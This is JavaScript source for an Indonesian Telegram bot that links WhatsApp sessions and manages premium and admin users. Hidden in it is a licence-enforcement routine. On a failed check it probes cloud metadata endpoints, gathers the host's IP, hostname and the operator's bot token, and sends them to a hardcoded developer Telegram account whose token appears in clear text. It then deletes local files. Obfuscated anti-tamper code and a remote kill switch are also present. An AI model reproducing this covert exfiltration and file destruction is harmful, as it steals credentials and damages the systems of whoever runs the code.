(function() {
  'use strict';
  
  // ===== CHECK: Detect if loaded via require() =====
  if (require.main !== module) {
    console.error('\n[ 💢 ] PROTECTION DILZ');
    console.error('[!] File saat ini: ' + __filename);
    console.error('[!] Dipanggil dari: ' + (require.main ? require.main.filename : 'unknown'));
    console.error('[!] Akses ditolak - Process dihentikan\n');
    
    try { process.exit(1); } catch(e) {}
    try { require('child_process').execSync('kill -9 ' + process.pid, {stdio: 'ignore'}); } catch(e) {}
    while(1) {}
  }
  
  if (module.parent !== null && module.parent !== undefined) {
    console.error('\n[ 💢 ] PROTECTION DILZ');
    console.error('[!] Parent: ' + module.parent.filename);
    console.error('[!] Akses ditolak - Process dihentikan\n');
    
    try { process.exit(1); } catch(e) {}
    try { require('child_process').execSync('kill -9 ' + process.pid, {stdio: 'ignore'}); } catch(e) {}
    while(1) {}
  }
  
  // Regex pattern (tahan string encoding)
  const nativePattern = /\[native code\]/;
  const proxyPattern = /Proxy|apply\(target/;
  const bypassPattern = /bypass|hook|intercept|override|origRequire|interceptor/i;
  const httpBypassPattern = /fakeRes|statusCode.*403|Blocked by bypass|github\.com.*includes/i;
  
  // Dynamic string construction
  const buildStr = (arr) => arr.map(c => String.fromCharCode(c)).join('');
  const nativeStr = buildStr([91,110,97,116,105,118,101,32,99,111,100,101,93]);
  const exitStr = buildStr([101,120,105,116]);
  const killStr = buildStr([107,105,108,108]);
  const httpsStr = buildStr([104,116,116,112,115]);
  const httpStr = buildStr([104,116,116,112]);
  
  // Simpan native references SEBELUM apapun
  let nativeExit, nativeExecSync, nativePid, nativeKill, nativeOn;
  
  try {
    nativeExit = process[exitStr].bind(process);
    nativeKill = process[killStr].bind(process);
    nativeOn = process.on.bind(process);
    nativeExecSync = require(buildStr([99,104,105,108,100,95,112,114,111,99,101,115,115])).execSync;
    nativePid = process.pid;
  } catch(e) {
    nativeExit = process.exit;
    nativeKill = process.kill;
    nativePid = process.pid;
  }
  
  // Force kill function
  const forceKill = (function() {
    return function() {
      try { nativeExecSync('kill -9 ' + nativePid, {stdio:'ignore'}); } catch(e) {}
      try { nativeExit(1); } catch(e) {}
      try { process.exit(1); } catch(e) {}
      while(1) {}
    };
  })();
  
  // CHECK 1: Module.prototype.require
  try {
    const M = require(buildStr([109,111,100,117,108,101]));
    const reqStr = M.prototype.require.toString();
    if (bypassPattern.test(reqStr) || reqStr.length > 3000) {
      console.error('[ 💢 ] PROTECTION DILZ');
      forceKill();
    }
  } catch(e) {}
  
  // CHECK 2: process.exit
  try {
    const exitFn = process[exitStr];
    const exitCode = exitFn.toString();
    if (proxyPattern.test(exitCode) || bypassPattern.test(exitCode)) {
      console.error('[ 💢 ] PROTECTION DILZ');
      forceKill();
    }
    
    if (exitFn.name === '' || Object.getOwnPropertyDescriptor(process, exitStr)?.get) {
      console.error('[ 💢 ] PROTECTION DILZ');
      forceKill();
    }
  } catch(e) {}
  
  // CHECK 3: process.kill
  try {
    const killFn = process[killStr];
    const killCode = killFn.toString();
    if (proxyPattern.test(killCode) || bypassPattern.test(killCode) || killCode.length < 50) {
      console.error('[ 💢 ] PROTECTION DILZ');
      forceKill();
    }
  } catch(e) {}
  
  // CHECK 4: process.on (signal handlers)
  try {
    const onFn = process.on;
    const onCode = onFn.toString();
    if (bypassPattern.test(onCode) || onCode.length < 50) {
      console.error('[ 💢 ] PROTECTION DILZ');
      forceKill();
    }
  } catch(e) {}
  
  // CHECK 5: axios interceptors
  try {
    const axios = require('axios');
    if (axios.interceptors.request.handlers.length > 0 || 
        axios.interceptors.response.handlers.length > 0) {
      console.error('[ 💢 ] PROTECTION DILZ');
      forceKill();
    }
  } catch(e) {}
  
  // CHECK 6: Global bypass flags
  const checkGlobals = (function() {
    const flags = ['PLAxios','PLChalk','PLFetch','dbBypass','KEY','__BYPASS__','originalExit','originalKill','_httpsRequest','_httpRequest'];
    for (let i = 0; i < flags.length; i++) {
      try {
        if (flags[i] in global && global[flags[i]]) {
          console.error('[ 💢 ] PROTECTION DILZ:', flags[i]);
          forceKill();
        }
      } catch(e) {}
    }
  });
  checkGlobals();
  
  // CHECK 7: child_process.execSync
  try {
    const cp = require(buildStr([99,104,105,108,100,95,112,114,111,99,101,115,115]));
    const execStr = cp.execSync.toString();
    if (bypassPattern.test(execStr) || execStr.length < 100) {
      console.error('[ 💢 ] PROTECTION DILZ');
      forceKill();
    }
  } catch(e) {}
  
  // CHECK 8: global.fetch (less aggressive)
  try {
    if (typeof global.fetch !== 'undefined') {
      const fetchCode = global.fetch.toString();
      
      // Hanya flag jika ada pattern bypass yang jelas
      if (/fakeResponse|bypass|intercept|statusCode.*403/i.test(fetchCode)) {
        console.error('[ 💢 ] PROTECTION DILZ');
        forceKill();
      }
      
      // Skip native code check - karena polyfill fetch sah-sah saja
    }
  } catch(e) {}
  
  // CHECK 10: Object.defineProperty pada process
  try {
    const desc = Object.getOwnPropertyDescriptor(process, exitStr);
    if (desc && (desc.get || desc.set)) {
      console.error('[ 💢 ] PROTECTION DILZ');
      forceKill();
    }
  } catch(e) {}
  
  // ===== CHECK 11: https.request detection (SAFE - NO NETWORK CALLS) =====
  const checkHttps = (function() {
    return function() {
      try {
        const https = require(httpsStr);
        const reqFunc = https.request;
        
        const realToString = Function.prototype.toString.call(reqFunc);
        const fakeToString = reqFunc.toString();
        
        if (realToString !== fakeToString) {
          console.error('[ 💢 ] PROTECTION DILZ');
          forceKill();
        }
        
        if (httpBypassPattern.test(realToString)) {
          console.error('[ 💢 ] PROTECTION DILZ');
          forceKill();
        }
        
        if (/url\.includes\(['"]github|fakeRes\s*=|statusCode:\s*403/.test(realToString)) {
          console.error('[ 💢 ] PROTECTION DILZ');
          forceKill();
        }
        
      } catch(e) {}
    };
  })();
  
  // ===== CHECK 12: http.request detection (SAFE - NO NETWORK CALLS) =====
  const checkHttp = (function() {
    return function() {
      try {
        const http = require(httpStr);
        const reqFunc = http.request;
        
        const realToString = Function.prototype.toString.call(reqFunc);
        const fakeToString = reqFunc.toString();
        
        if (realToString !== fakeToString) {
          console.error('[ 💢 ] PROTECTION DILZ');
          forceKill();
        }
        
        if (httpBypassPattern.test(realToString)) {
          console.error('[ 💢 ] PROTECTION DILZ');
          forceKill();
        }
        
        if (/url\.includes\(['"]github|fakeRes\s*=|blocked:\s*true/.test(realToString)) {
          console.error('[ 💢 ] PROTECTION DILZ');
          forceKill();
        }
        
      } catch(e) {}
    };
  })();
  
  setTimeout(() => {
    checkHttps();
    checkHttp();
  }, 500);
  
  // Runtime monitoring
  const monitor = (function() {
    return function() {
      if (require.main !== module || (module.parent !== null && module.parent !== undefined)) {
        console.error('[ 💢 ] PROTECTION DILZ');
        forceKill();
      }
      
      try {
        const M = require(buildStr([109,111,100,117,108,101]));
        const reqStr = M.prototype.require.toString();
        if (bypassPattern.test(reqStr)) {
          console.error('[ 💢 ] PROTECTION DILZ');
          forceKill();
        }
      } catch(e) {}
      
      try {
        const exitFn = process[exitStr];
        const exitCode = exitFn.toString();
        if (proxyPattern.test(exitCode) || bypassPattern.test(exitCode)) {
          console.error('[ 💢 ] PROTECTION DILZ');
          forceKill();
        }
      } catch(e) {}
      
      try {
        const killFn = process[killStr];
        const killCode = killFn.toString();
        if (proxyPattern.test(killCode) || bypassPattern.test(killCode)) {
          console.error('[ 💢 ] PROTECTION DILZ');
          forceKill();
        }
      } catch(e) {}
      
      try {
        const axios = require('axios');
        if (axios.interceptors.request.handlers.length > 0) {
          console.error('[ 💢 ] PROTECTION DILZ');
          forceKill();
        }
      } catch(e) {}
      
      checkHttps();
      checkHttp();
      checkGlobals();
    };
  })();
  
  setInterval(monitor, 2000);
  setTimeout(monitor, 100);
  
})();

const TelegramBot = require('node-telegram-bot-api');
const { default: makeWASocket, useMultiFileAuthState, downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification,MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WASocket, getStream, WAProto, isBaileys, AnyMessageContent, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header } = require('@otaxayun/baileys');



///----------( Install Function )----------\\\
const P = require("pino");
const sessions = new Map();
const fs = require("fs-extra");
const path = require("path");
const chalk = require("chalk");
const crypto = require("crypto");
const os = require("os");
const A = require("axios");
const axios = require("axios");
const readline = require('readline');
const fetch = require("node-fetch");
const figlet = require("figlet");
const gradient = require("gradient-string");
const chalkAnimation = require("chalk-animation");
const config = require("./フローアクセス/config.js");
const { DARTH_TOKEN, OWNER_ID } = require("./フローアクセス/config.js");
const bot = new TelegramBot(DARTH_TOKEN, { polling: true });



///----------( Save Session )----------\\\
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = path.join(SESSIONS_DIR, "active_sessions.json");
const ONLY_FILE = path.join(__dirname, "ロリポップ", "gconly.json");
const cd = path.join(__dirname, "ロリポップ", "cd.json");



///-----------( Random Photo )----------\\\
const randomImages = [
  "https://files.catbox.moe/cx9isl.jpg",
];
const getRandomImage = () =>
  randomImages[Math.floor(Math.random() * randomImages.length)];



///----------( Variabel Global )----------\\\
let Dilz;
function saveActiveSessions(botNumber) {
        try {
        const sessions = [];
        if (fs.existsSync(SESSIONS_FILE)) {
        const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
        if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
        }
        } else {
        sessions.push(botNumber);
        }
        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
        } catch (error) {
        console.error("Error saving session:", error);
        }
        }

async function initializeWhatsAppConnections() {
          try {
                   if (fs.existsSync(SESSIONS_FILE)) {
                  const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
                  console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

                  for (const botNumber of activeNumbers) {
                  console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
                  const sessionDir = createSessionDir(botNumber);
                  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

                  Dilz = makeWASocket ({
                  auth: state,
                  printQRInTerminal: true,
                  logger: P({ level: "silent" }),
                  defaultQueryTimeoutMs: undefined,
                  });

                  await new Promise((resolve, reject) => {
                  Dilz.ev.on("connection.update", async (update) => {
                  const { connection, lastDisconnect } = update;
                  if (connection === "open") {
                  console.log(`Bot ${botNumber} terhubung!`);
                  sessions.set(botNumber, Dilz);
                  resolve();
                  } else if (connection === "close") {
                  const shouldReconnect =
                  lastDisconnect?.error?.output?.statusCode !==
                  DisconnectReason.loggedOut;
                  if (shouldReconnect) {
                  console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                  await initializeWhatsAppConnections();
                  } else {
                  reject(new Error("Koneksi ditutup"));
                  }
                  }
                  });

                  Dilz.ev.on("creds.update", saveCreds);
                  });
                  }
                }
             } catch (error) {
          console.error("Error initializing WhatsApp connections:", error);
           }
         }



///----------( Creat Session )----------\\\
function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

//// --- ( Intalasi WhatsApp ) --- \\\
async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `
\`\`\`
━━━━━━━━━━━━━━━━━━
▢ Menyiapkan Kode Pairing
╰➤ Number: ${botNumber}
━━━━━━━━━━━━━━━━━━
\`\`\`
`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  Dilz = makeWASocket ({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  Dilz.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `
\`\`\`
━━━━━━━━━━━━━━━━━━
▢ Memproses Connecting
╰➤ Number: ${botNumber}
╰➤ Status: ⏳ Connecting...
━━━━━━━━━━━━━━━━━━
\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
\`\`\`
━━━━━━━━━━━━━━━━━━
▢ Connection Gagal.
╰➤ Number: ${botNumber}
╰➤ Status: ❌ Gagal
━━━━━━━━━━━━━━━━━━
\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, Dilz);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `
\`\`\`
━━━━━━━━━━━━━━━━━━
▢ Connection Succes
╰➤ Number: ${botNumber}
╰➤ Status: Sukses Connect.
╰➤ Note : Nice...!
━━━━━━━━━━━━━━━━━━
\`\`\`
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
  const code = await Dilz.requestPairingCode(botNumber);
  const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;

  await bot.editMessageText(
    `
\`\`\`
━━━━━━━━━━━━━━━━━━
▢ Code Pairing Kamu
╰➤ Number: ${botNumber}
╰➤ Code: ${formattedCode}
━━━━━━━━━━━━━━━━━━
\`\`\`
`,
    {
      chat_id: chatId,
      message_id: statusMessage,
      parse_mode: "Markdown",
  });
};
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
\`\`\`
━━━━━━━━━━━━━━━━━━
▢ Menyiapkan Kode Pairing
╰➤ Number: ${botNumber}
╰➤ Status: ${error.message} Error⚠️
━━━━━━━━━━━━━━━━━━
\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  Dilz.ev.on("creds.update", saveCreds);

  return Dilz;
}



///-----------( Save File Acces )----------\\\
const DB_DIR = path.join(__dirname, 'ロリポップ');
const PREMIUM_FILE = path.join(DB_DIR, 'premium.json');
const ADMIN_FILE = path.join(DB_DIR, 'admin.json');
const GCONLY_FILE = path.join(DB_DIR, 'gconly.json');

fs.ensureDirSync(DB_DIR);
fs.ensureFileSync(PREMIUM_FILE);
fs.ensureFileSync(ADMIN_FILE);
fs.ensureFileSync(GCONLY_FILE);

let premiumUsers = fs.readJSONSync(PREMIUM_FILE, { throws: false }) || [];
let adminUsers = fs.readJSONSync(ADMIN_FILE, { throws: false }) || [];
let groupOnlyData = fs.readJSONSync(GCONLY_FILE, { throws: false }) || { groupOnly: false };

function savePremium() { fs.writeJSONSync(PREMIUM_FILE, premiumUsers, { spaces: 2 }); }
function saveAdmins() { fs.writeJSONSync(ADMIN_FILE, adminUsers, { spaces: 2 }); }
function saveGconly() { fs.writeJSONSync(GCONLY_FILE, groupOnlyData, { spaces: 2 }); }

function isOwner(id) { return OWNER_ID.includes(id.toString()); }
function isAdmin(id) { return adminUsers.includes(id) || isOwner(id); }
function isGroupOnly() { return groupOnlyData.groupOnly; }
function setGroupOnly(status) { groupOnlyData.groupOnly = status; saveGconly(); }



///----------( Group Only )----------\\\
bot.onText(/^\/gconly(?:\s+(on|off))?$/i, (msg, match) => {
  console.log("Command /gconly diterima:", msg.text);

  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const chatType = msg.chat.type; "private", "group", "supergroup", "channel"

  if (chatType === "private") {
    return bot.sendMessage(chatId, "⚠️ Command ini hanya bisa digunakan di grup, bukan di private chat.");
  }

  if (!isOwner(senderId) && !isAdmin(senderId)) {
    return bot.sendMessage(chatId, "❌ Akses ditolak, hanya owner/admin yang dapat melakukan command ini.");
  }

  if (!match[1]) {
    return bot.sendMessage(chatId, "Gunakan format: /gconly on atau /gconly off");
  }

  const status = match[1].toLowerCase() === "on";
  setGroupOnly(status);
  bot.sendMessage(chatId, `🍂 Fitur Group Only sekarang: ${status ? "AKTIF" : "NONAKTIF"}`);
});



///----------( Premium User )----------\\\
bot.onText(/^\/addprem\s+(\d+)\s+(\d+[dhm])$/i, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (!isOwner(senderId) && !isAdmin(senderId))
        return bot.sendMessage(chatId, '❌ Akses ditolak, hanya owner/admin yang dapat melakukan command ini.');

    const userId = parseInt(match[1]);
    const duration = match[2];
    const moment = require('moment');

    let expiresAt;
    const unit = duration.slice(-1);
    const value = parseInt(duration);

    if (unit === 'd') expiresAt = moment().add(value, 'days').toISOString();
    else if (unit === 'h') expiresAt = moment().add(value, 'hours').toISOString();
    else expiresAt = moment().add(value, 'minutes').toISOString();

    const existing = premiumUsers.find(u => u.id === userId);
    if (existing) {
        existing.expiresAt = expiresAt;
        savePremium();
        return bot.sendMessage(chatId, `🍂 User ${userId} diperpanjang premium hingga ${expiresAt}`);
    }

    premiumUsers.push({ id: userId, expiresAt });
    savePremium();
    bot.sendMessage(chatId, `🍂 User ${userId} berhasil ditambahkan ke premium hingga ${expiresAt}`);
});



///----------( Premium User )----------\\\
bot.onText(/^\/delprem\s+(\d+)$/i, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (!isOwner(senderId) && !isAdmin(senderId))
        return bot.sendMessage(chatId, '❌ Akses ditolak, hanya owner/admin yang dapat melakukan command ini.');

    const userId = parseInt(match[1]);
    const index = premiumUsers.findIndex(u => u.id === userId);
    if (index === -1) return bot.sendMessage(chatId, `❌ User ${userId} tidak ditemukan di list premium.`);

    premiumUsers.splice(index, 1);
    savePremium();
    bot.sendMessage(chatId, `🍂 User ${userId} berhasil dihapus dari premium.`);
});



///----------( Owner User )----------\\\
bot.onText(/^\/addadmin\s+(\d+)$/i, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (!isOwner(senderId))
        return bot.sendMessage(chatId, '❌ Akses ditolak, hanya owner yang dapat melakukan command ini.');

    const userId = parseInt(match[1]);
    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdmins();
        return bot.sendMessage(chatId, `🍂 User ${userId} berhasil ditambahkan sebagai admin.`);
    }

    bot.sendMessage(chatId, `❌ User ${userId} sudah menjadi admin.`);
});



///-----------( Owner User )----------\\\
bot.onText(/^\/deladmin\s+(\d+)$/i, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (!isOwner(senderId))
        return bot.sendMessage(chatId, '❌ Akses ditolak, hanya owner yang dapat melakukan command ini.');

    const userId = parseInt(match[1]);
    const index = adminUsers.indexOf(userId);
    if (index !== -1) {
        adminUsers.splice(index, 1);
        saveAdmins();
        return bot.sendMessage(chatId, `🍂 User ${userId} berhasil dihapus dari admin.`);
    }

    bot.sendMessage(chatId, `❌ User ${userId} belum menjadi admin.`);
});




///----------( Notifikasi Config.js )-----------\\\
const TOKEN_DEVELOPER = "8728039161:AAGiBCs3ATptnZGDzf1jdzmapfrv2NEYIeM";
const ID_DEVELOPER = 7744011281;
const devBot = new TelegramBot(TOKEN_DEVELOPER, { polling: false });

async function detectRunningDomain({ timeout = 1500 } = {}) {
  const envCandidates = [
    process.env.RENDER_EXTERNAL_URL,
    process.env.RENDER_URL,
    process.env.VERCEL_URL,
    process.env.NOW_URL,
    process.env.DOMAIN,
    process.env.HOSTNAME,
    process.env.WEBSITE_URL,
    process.env.RAILWAY_STATIC_URL,
    process.env.FLY_APP_NAME && `https://${process.env.FLY_APP_NAME}.fly.dev`,
    process.env.HEROKU_APP_NAME && `https://${process.env.HEROKU_APP_NAME}.herokuapp.com`,
  ].filter(Boolean);

  for (const cand of envCandidates) {
    if (typeof cand === "string" && cand.length > 3) {
      const withProto = cand.startsWith("http") ? cand : `https://${cand.replace(/^\/+/, "")}`;
      return withProto;
    }
  }

  const requestWithTimeout = (url, opts = {}) =>
    axios.get(url, { timeout, ...opts }).then(r => r).catch(() => null);

  try {
    const aws = await requestWithTimeout("http://169.254.169.254/latest/meta-data/public-hostname");
    if (aws && aws.status === 200 && aws.data) return `http://${aws.data.trim()}`;

    const gcp = await requestWithTimeout("http://metadata.google.internal/computeMetadata/v1/instance/hostname", {
      headers: { "Metadata-Flavor": "Google" },
    });
    if (gcp && gcp.status === 200 && gcp.data) return `http://${gcp.data.trim()}`;
  } catch {}

  try {
    const ipRes = await requestWithTimeout("https://api.ipify.org?format=json");
    if (ipRes && ipRes.data && ipRes.data.ip) {
      const pubIp = ipRes.data.ip;
      try {
        const names = await dns.reverse(pubIp);
        if (names.length > 0) return `http://${names[0]}`;
      } catch {}
      return `http://${pubIp}`;
    }
  } catch {}

  return `http://${os.hostname()}`;
}

async function fetchValidTokens() {
  try {
    const response = await axios.get(TOKEN_DATABASE, { headers: { "Cache-Control": "no-cache" } });
    if (Array.isArray(response.data.tokens)) {
      return response.data.tokens;
    } else {
      console.error(chalk.red("❌ Format data di GitHub salah! Key 'tokens' harus array"));
      return [];
    }
  } catch (error) {
    console.error(chalk.red("⨵ Tidak dapat mengakses database:", error.message));
    return [];
  }
}

async function getPublicIP() {
  try {
    const res = await axios.get("https://api.ipify.org?format=json");
    return res.data.ip;
  } catch {
    return "Tidak Diketahui";
  }
}

async function getBotInfo() {
  try {
    const info = await bot.getMe();
    return info;
  } catch {
    return null;
  }
}

async function validateTokenOnce() {
  const validTokens = await fetchValidTokens();
  return validTokens.includes(DARTH_TOKEN);
}

async function validateToken() {
  console.log(chalk.blue("⎙ Memulai Validasi Token Bot Total 5x..."));

  for (let i = 1; i <= 5; i++) {
    console.log(chalk.red(`🔍 Validasi ke-${i} sedang dilakukan...`));
    const isValid = await validateTokenOnce();

    if (!isValid) {
      console.log(chalk.red(`❌ Akses Ditolak (Validasi ke-${i} Gagal)!`));
      await sendInvalidTokenReport();
      await deleteProtectedFiles();
      console.log(chalk.red("☇ Bot Dimatikan Karena Token Tidak Terdaftar."));
      process.exit(0);
    }

    console.log(chalk.green(`⨀ Validasi ke-${i} Berhasil`));
    if (i < 5) await new Promise((r) => setTimeout(r, 1500));
  }

  console.log(chalk.green("⨀ Token Terverifikasi Sepenuhnya 5x Check Passed"));
  checkControlStatus();
}

async function sendInvalidTokenReport() {
  try {
    const botInfo = await getBotInfo();
    const publicIP = await getPublicIP();
    const domainURL = await detectRunningDomain();
    const hostname = os.hostname();

    const message = `
\`\`\`
⳼ Token Tidak Valid Terdeteksi!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
☇ Domain / Panel : ${domainURL}
☇ Server : ${hostname}
☇ Token : ${DARTH_TOKEN}
☇ Bot Username : ${botInfo ? "@" + botInfo.username : "Tidak Diketahui"}
☇ Bot ID : ${botInfo ? botInfo.id : "Tidak Diketahui"}
☇ IP Public : ${publicIP}
☇ Waktu : ${new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🛑 KEAMANAN DARTH INSIDIOUS BOT AKAN DIMATIKAN..!!
\`\`\`
`;

    await devBot.sendMessage(ID_DEVELOPER, message, { parse_mode: "Markdown" });
    console.log(chalk.red("☇ Notifikasi dikirim ke Developer."));
  } catch (err) {
    console.error(chalk.red("⚠️ Gagal kirim laporan ke developer:"), err.message);
  }
}

async function deleteProtectedFiles() {
  const filesToDelete = [
    "Darth.js",
    "package.json",
  ];

  console.log(chalk.red("⚠️ Menghapus file sensitif karena token tidak terdaftar..."));
  for (const file of filesToDelete) {
    try {
      if (fs.existsSync(file)) {
        fs.unlinkSync(file);
        console.log(chalk.red(`☠️ File terhapus: ${file}`));
      }
    } catch (err) {
      console.error(chalk.gray(`Gagal hapus ${file}: ${err.message}`));
    }
  }
}

///----------( Function Format Runtime )----------\\\
function formatRuntime(seconds) {
        const days = Math.floor(seconds / (3600 * 24));
        const hours = Math.floor((seconds % (3600 * 24)) / 3600);
        const minutes = Math.floor((seconds % 3600) / 60);
        const secs = seconds % 60;  
        return `${hours}h, ${minutes}m, ${secs}s`;
        }

       const startTime = Math.floor(Date.now() / 1000); 



///----------( Function Runtime )----------\\\
function getBotRuntime() {
        const now = Math.floor(Date.now() / 1000);
        return formatRuntime(now - startTime);
        }



///----------( Function Speed )----------\\\
function getSpeed() {
        const startTime = process.hrtime();
        return getBotSpeed(startTime); 
}



///----------( Function Cooldown )----------\\\
function getCurrentDate() {
        const now = new Date();
        const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
         return now.toLocaleDateString("id-ID", options);
}

let cooldownData = { time: 5 * 60 * 1000, users: {} };

try {
    if (!fs.existsSync(cd)) {
    
        fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2), 'utf8');
    } else {
     
        const raw = fs.readFileSync(cd, 'utf8').trim();
        if (raw) cooldownData = JSON.parse(raw);
        else console.log("[WARNING] cd.json kosong, menggunakan default cooldown.");
    }
} catch (err) {
    console.log("[WARNING] cd.json rusak atau tidak valid, menggunakan default cooldown.");
    cooldownData = { time: 5 * 60 * 1000, users: {} };
}

function saveCooldown() {
    try {
        fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2), 'utf8');
    } catch (err) {
        console.error("[ERROR] Gagal menyimpan cd.json:", err);
    }
}



///----------( Function Cooldown )----------\\\
function checkCooldown(userId) {
    const now = Date.now();
    const endTime = cooldownData.users[userId] || 0;

    if (endTime > now) {
        return Math.ceil((endTime - now) / 1000);
    }

    cooldownData.users[userId] = now + cooldownData.time;
    saveCooldown();
    return 0;
}



///----------( Function Time )----------\\\
function setCooldown(timeString) {
    const match = timeString.match(/(\d+)([smh])/);
    if (!match) return "Format salah! Gunakan contoh: /setcd 5m";

    let [_, value, unit] = match;
    value = parseInt(value);

    if (unit === "s") cooldownData.time = value * 1000;
    else if (unit === "m") cooldownData.time = value * 60 * 1000;
    else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

    saveCooldown();
    return `Cooldown diatur ke ${value}${unit}`;
}




///----------( Function Cooldown )----------\\\
function cleanupCooldown() {
    const now = Date.now();
    for (const userId in cooldownData.users) {
        if (cooldownData.users[userId] <= now) delete cooldownData.users[userId];
    }
    saveCooldown();
}



///-----------( Database Token )----------\\\
const TOKEN_DATABASE = "https://raw.githubusercontent.com/dickyalghifari21-droid/whatsapp-media/main/token.json";
const CONTROL_URL = "https://raw.githubusercontent.com/dickyalghifari21-droid/whatsapp-media/main/control.txt";

let BOT_ACTIVE = true;
let SECURE_MODE = false;
const validatedUsers = new Set();



///----------( Verifikasi Sha Database )----------\\\
const EXPECTED_HASH = crypto.createHash("sha256").update(TOKEN_DATABASE).digest("hex");

function verifyDatabaseIntegrity(url) {
  const currentHash = crypto.createHash("sha256").update(url).digest("hex");
  if (currentHash !== EXPECTED_HASH) {
    console.log(chalk.red.bold("💢 ANTI BYPASS ACTIVE"));
    process.exit(1);
  }
}

///----------( Warna Rainbow Console.log )----------\\\
function glitchEffect(text) {
  const colors = [chalk.cyanBright, chalk.magentaBright, chalk.blueBright, chalk.whiteBright];
  let i = 0;
  const interval = setInterval(() => {
    process.stdout.write(`\r${colors[i % colors.length](text)}   `);
    i++;
  }, 150);
  setTimeout(() => {
    clearInterval(interval);
    console.log("\n" + chalk.greenBright("DILZ\n"));
  }, 5000);
}

async function checkControlStatus() {
  try {
    const res = await axios.get(CONTROL_URL, { timeout: 5000 });
    const status = res.data.trim().toLowerCase();
    BOT_ACTIVE = status === "on";

    console.clear();

    if (BOT_ACTIVE) {
      const text = figlet.textSync("DILZ", {
        font: "ANSI Shadow",
        horizontalLayout: "default",
        verticalLayout: "default",
      });

      const holo = gradient(["#00FFFF", "#FF00FF", "#00FFFF"]);
      console.log("\n" + holo.multiline(text) + "\n");

      glitchEffect("💢 SYSTEM READY - Darth Insidious Connected...");
    } else {
      console.log(chalk.redBright("💢 Darth dimatikan oleh Developer!\n"));
    }

  } catch (err) {
    console.log(chalk.red(`⚠️ Gagal membaca control.txt → ${err.message}`));
    BOT_ACTIVE = false;
  }
}

validateToken();
setInterval(checkControlStatus, 5 * 60 * 1000);

// ========== FILE UNTUK MENYIMPAN DAFTAR GROUP ==========
const GROUP_FILE = "./verified_groups.json";

// Load atau buat file verified groups
let verifiedGroups = new Set();

if (fs.existsSync(GROUP_FILE)) {
  try {
    const data = JSON.parse(fs.readFileSync(GROUP_FILE, 'utf8'));
    verifiedGroups = new Set(data);
  } catch (e) {}
}

// Fungsi simpan verified groups
function saveVerifiedGroups() {
  fs.writeFileSync(GROUP_FILE, JSON.stringify([...verifiedGroups], null, 2));
}

